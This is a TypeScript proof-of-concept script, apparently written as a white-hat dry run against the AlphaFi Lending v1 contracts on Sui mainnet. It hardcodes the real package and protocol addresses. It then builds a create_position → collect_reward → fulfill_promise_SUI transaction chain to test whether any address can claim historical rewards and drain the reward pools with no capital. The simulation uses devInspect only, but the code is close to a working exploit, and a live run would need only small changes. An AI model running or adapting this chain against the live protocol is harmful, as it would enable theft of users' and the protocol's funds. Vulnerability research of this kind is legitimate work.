/**
 * White-Hat PoC: AlphaFi Lending v1 Reward Claim Investigation (Dry-Run)
 *
 * Research questions:
 *   1. Does v1 collect_reward have a version guard?
 *   2. Is reward index initialized to 0 for fresh PositionCap?
 *   3. Can fresh address create_position → collect_reward → fulfill_promise drain reward pools?
 *
 * Attack hypothesis:
 *   create_position() → any address gets fresh PositionCap (no permissions needed)
 *   collect_reward() → if index=0 for new positions, claims full historical rewards
 *   fulfill_promise() → releases actual coins from protocol
 *
 * This script runs ONLY devInspectTransactionBlock. No funds moved.
 */

import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const V1_PKG     = "0xd631cd66138909636fc3f73ed75820d0c5b76332d1644608ed1c85ea2b8219b4";
const PROTOCOL   = "0x01d9cf05d65fa3a9bb7163095139120e3c4e414dfbab153a49779a7d14010b93";
const CLOCK      = "0x0000000000000000000000000000000000000000000000000000000000000006";
const SUI_SYSTEM = "0x0000000000000000000000000000000000000000000000000000000000000005";
const SUI_TYPE   = "0x2::sui::SUI";

// ─── Step 1: Check protocol version and markets ───────────────────────────────

async function checkProtocolState(client: SuiClient) {
  console.log("\n[1] Protocol state:");
  const obj = await client.getObject({
    id: PROTOCOL,
    options: { showContent: true }
  });
  const f = (obj.data?.content as any)?.fields ?? {};
  console.log("  version:", f.version);
  console.log("  markets count:", f.markets?.fields?.size);
  console.log("  reward_autocompounding:", f.config?.fields?.reward_autocompounding);
}

// ─── Step 2: Check reward distributors ────────────────────────────────────────

async function checkRewardDistributors(client: SuiClient) {
  console.log("\n[2] Sampling market 0 for reward distributors:");
  try {
    // markets table
    const marketsTableId = "0x2326d387ba8bb7d24aa4cfa31f9a1e58bf9234b097574afb06c5dfb267df4c2e";
    const market0 = await client.getDynamicFieldObject({
      parentId: marketsTableId,
      name: { type: "u64", value: "0" },
    });
    const mf = (market0.data?.content as any)?.fields?.value?.fields ?? {};
    console.log("  market 0 type:", mf.coin_type ?? "(unknown)");
    const rdist = mf.reward_distributor?.fields ?? {};
    console.log("  reward_distributor fields:", Object.keys(rdist));

    // Check reward distributor index
    const globalIdx = rdist.reward_per_share ?? rdist.index ?? rdist.current_index ?? "N/A";
    console.log("  global reward index:", globalIdx);
    const balance = rdist.balance?.fields?.value ?? rdist.total_reward ?? "N/A";
    console.log("  reward balance:", balance);
  } catch(e: any) {
    console.log("  Error:", e.message);
  }
}

// ─── Step 3: devInspect — create_position → collect_reward → fulfill_promise ──

async function dryRunRewardClaim(
  client: SuiClient,
  sender: string,
  marketId: number,
  useV1: boolean = true
) {
  const pkg = V1_PKG;
  console.log(`\n[3] devInspect — create_position → collect_reward → fulfill_promise`);
  console.log(`  Sender: ${sender.slice(0, 22)}...`);
  console.log(`  Market ID: ${marketId}`);
  console.log(`  Package: v1 (${pkg.slice(0, 22)}...)`);

  const tx = new Transaction();
  tx.setSender(sender);

  // Step A: create fresh PositionCap (no permissions needed)
  const [posCap] = tx.moveCall({
    target: `${pkg}::alpha_lending::create_position`,
    typeArguments: [],
    arguments: [
      tx.object(PROTOCOL),
    ],
  });

  // Step B: collect_reward — will fail if version guard exists OR if no rewards
  const [_rewardCoin, promise] = tx.moveCall({
    target: `${pkg}::alpha_lending::collect_reward`,
    typeArguments: [SUI_TYPE],
    arguments: [
      tx.object(PROTOCOL),
      tx.pure.u64(marketId),
      posCap,
      tx.object(CLOCK),
    ],
  });

  // Step C: fulfill_promise_SUI — completes the reward cycle
  const [finalCoin] = tx.moveCall({
    target: `${pkg}::alpha_lending::fulfill_promise_SUI`,
    typeArguments: [],
    arguments: [
      tx.object(PROTOCOL),
      promise,
      tx.object(SUI_SYSTEM),
      tx.object(CLOCK),
    ],
  });

  // Transfer results to sender
  tx.transferObjects([posCap, _rewardCoin, finalCoin], sender);

  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender,
  });

  const status = result.effects?.status?.status;
  const error  = result.effects?.status?.error ?? "";

  console.log("\n  [RESULT] Status:", status);
  if (status === "success") {
    console.log("  ✅ FULL CHAIN SUCCEEDS:");
    console.log("     create_position → PositionCap (no permissions needed) ✓");
    console.log("     collect_reward v1 → no version guard confirmed ✓");
    console.log("     fulfill_promise_SUI → reward coins released ✓");
    console.log("  → ANY attacker can drain reward pools with 0 capital");
  } else {
    console.log("  Error:", error);
    const cmd = error.match(/in command (\d+)/)?.[1];
    if (cmd === "0") {
      console.log("  → create_position failed");
    } else if (cmd === "1") {
      console.log("  → collect_reward failed");
      if (error.includes("EIncorrectVersion") || error.includes("version")) {
        console.log("  → VERSION GUARD IN PLACE — not exploitable via v1");
      } else if (error.includes("reward") || error.includes("0")) {
        console.log("  → No rewards to claim for fresh position (index initialized correctly?)");
      }
    } else if (cmd === "2") {
      console.log("  → fulfill_promise failed (chain got that far — collect_reward succeeded)");
    }
  }

  return { status, error };
}

// ─── Step 4: Check if latest package has different behavior ───────────────────

async function checkLatestPackage(client: SuiClient) {
  console.log("\n[4] Finding latest AlphaFi package:");
  // Get package history via upgrade cap
  try {
    const pkgObj = await client.getObject({
      id: V1_PKG,
      options: { showContent: true, showType: true }
    });
    console.log("  v1 package type:", pkgObj.data?.type);
  } catch(e: any) {
    console.log("  Error:", e.message);
  }
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });
  const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";

  console.log("=".repeat(64));
  console.log("  AlphaFi Lending v1 — White-Hat Reward Audit (DRY-RUN)");
  console.log("  ⚠  devInspect ONLY — zero funds moved");
  console.log("=".repeat(64));

  await checkProtocolState(client);
  await checkRewardDistributors(client);

  // Try market 0 (likely SUI or major asset)
  await dryRunRewardClaim(client, DUMMY, 0);

  // Also try market 1
  await dryRunRewardClaim(client, DUMMY, 1);

  console.log("\n" + "=".repeat(64));
  console.log("  SUMMARY");
  console.log("=".repeat(64));
  console.log("  AlphaFi key differences from NAVI v1:");
  console.log("  1. No entry functions — all calls via PTB only");
  console.log("  2. PositionCap required (owned object) — but create_position() is permissionless");
  console.log("  3. LiquidityPromise hot potato — must fulfill in same PTB");
  console.log("  4. Version stored in LendingProtocol.version (state-based)");
  console.log("  5. Question: does collect_reward check assert!(protocol.version == CURRENT)?");
}

main().catch(console.error);
